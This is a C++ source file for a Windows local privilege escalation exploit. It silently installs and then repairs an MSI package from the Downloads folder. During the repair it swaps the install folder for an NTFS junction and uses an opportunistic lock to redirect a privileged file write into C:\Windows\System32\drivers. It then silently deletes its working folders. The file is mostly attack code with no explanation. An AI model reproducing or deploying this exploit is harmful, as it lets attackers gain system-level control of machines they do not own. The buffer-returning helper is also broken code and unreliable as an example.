#include "stdafx.h"
#include "ReparsePoint.h"
#include <iostream>
#include "FileOpLock.h"
#include <windows.h>
#include <iostream>
#include <shlobj.h>
#pragma comment(lib, "shell32.lib")
using namespace std;

LPWSTR combine(LPWSTR origin, LPWSTR add)
{
	
	wchar_t rstring[200] = { 0 };
	wcscat(rstring, origin);
	wcscat(rstring, add);
	return rstring;
}

void UnlockFile()
{
	LPWSTR mydesktop = NULL;
	SHGetKnownFolderPath(FOLDERID_Desktop, KF_FLAG_CREATE, NULL, &mydesktop);
	LPWSTR folder = NULL;
	LPWSTR foldername = L"\\payload";
	 folder = combine(mydesktop, foldername);
	 LPWSTR foldertrash = NULL;
	printf("Unlocking File\n");
	LPWSTR trash = L"\\trash2";
	
	foldertrash = combine(mydesktop, trash);
	MoveFile(folder,foldertrash);
	CreateDirectory(folder, NULL);
	HANDLE hJunction = CreateFile(folder, GENERIC_READ | FILE_WRITE_DATA,
	FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT,nullptr);
	ReparsePoint::CreateMountPoint(hJunction, L"c:\\windows\\system32\\drivers", L"");
	
}

int _tmain()
{

LPWSTR mydesktop = NULL;
LPWSTR foldername = L"\\payload";
SHGetKnownFolderPath(FOLDERID_Desktop, KF_FLAG_CREATE, NULL, &mydesktop);
LPWSTR folder = NULL;

folder = combine(mydesktop, foldername);
LPWSTR trash = L"\\trash";
LPWSTR foldertrash = NULL;
foldertrash =  combine(mydesktop, trash);

//run our installer and sleep 

WinExec("\"c:\\windows\\system32\\cmd.exe\" /k msiexec /i c:\\users\\%username%\\downloads\\payload.msi /quiet", 5);
Sleep(5000);

//move our installed folder (trash it!)

MoveFile(folder, foldertrash);

//Create a new empty folder that we can use as a junction

CreateDirectory(folder, NULL);

HANDLE hJunction = CreateFile(folder, GENERIC_READ | FILE_WRITE_DATA,
FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE, nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, nullptr);

LPWSTR payload2 = L"\\payload2";
LPWSTR folderpayload2 = NULL;
folderpayload2 = combine(mydesktop, payload2);

//Create a second folder for some advanced trickery

CreateDirectory(folderpayload2, NULL);


LPWSTR filetarget = L"\\payload2\\WindowsTrustedRTProxy.sys";
LPWSTR folderfiletarget = NULL;
folderfiletarget  = combine(mydesktop, filetarget);

HANDLE file = CreateFile(folderfiletarget, GENERIC_WRITE, 0, nullptr,CREATE_ALWAYS, NULL, nullptr);
CloseHandle(file);
WinExec("\"c:\\windows\\system32\\cmd.exe\" /k c:\\users\\%username%\\downloads\\bat.bat", 5);
Sleep(2000);
ReparsePoint::CreateMountPoint(hJunction, folderpayload2, L"");
CloseHandle(hJunction);

LPWSTR target = L"\\payload2\\WindowsTrustedRTProxy.sys";
LPWSTR foldertarget = combine(mydesktop, target);

FileOpLock* lock = FileOpLock::CreateLock(foldertarget, UnlockFile);
WinExec("\"c:\\windows\\system32\\cmd.exe\" /k msiexec /f c:\\users\\%username%\\downloads\\payload.msi /quiet", 5);
Sleep(5000);
	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k RMDIR c:\\users\\%username%\\desktop\\payload /S /Q", 5);
	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k RMDIR c:\\users\\%username%\\desktop\\payload2 /S /Q", 5);
	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k RMDIR c:\\users\\%username%\\desktop\\trash /S /Q", 5);
	WinExec("\"c:\\windows\\system32\\cmd.exe\" /k RMDIR c:\\users\\%username%\\desktop\\trash2 /S /Q", 5);
return 0;
}

